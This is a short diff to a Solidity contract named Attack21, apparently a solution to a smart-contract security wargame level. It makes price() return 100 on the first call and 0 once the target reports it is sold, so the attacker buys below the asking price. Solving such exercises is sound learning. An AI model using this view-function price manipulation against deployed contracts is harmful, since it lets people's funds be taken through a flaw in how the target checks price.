@@ -11,8 +11,12 @@ contract Attack21 {
     }
 
     function price() external view returns (uint){
-        // price = ???
-        // return price
+        if (target.isSold()) {
+            // second iteration - we win!
+            return 0;
+        } 
+        // first iteration
+        return 100;
     }
 
     function attack() public {
